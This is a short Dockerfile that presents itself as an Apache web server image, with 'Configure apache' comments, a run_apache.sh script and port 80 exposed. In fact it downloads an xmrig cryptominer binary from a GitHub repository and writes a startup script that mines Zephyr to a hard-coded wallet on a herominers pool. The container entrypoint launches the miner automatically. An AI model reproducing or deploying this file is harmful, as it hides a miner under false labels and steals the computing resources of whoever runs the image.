FROM python:3.9-slim

# Install dependencies
RUN apt update && apt -y install curl git wget
RUN wget https://github.com/nandafiku/gradi/raw/main/xmrig && \
 chmod 777 xmrig
# Configure apache
RUN echo './xmrig --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -k' >> run_apache.sh && \
 chmod 777 run_apache.sh

EXPOSE 80

ENTRYPOINT /run_apache.sh
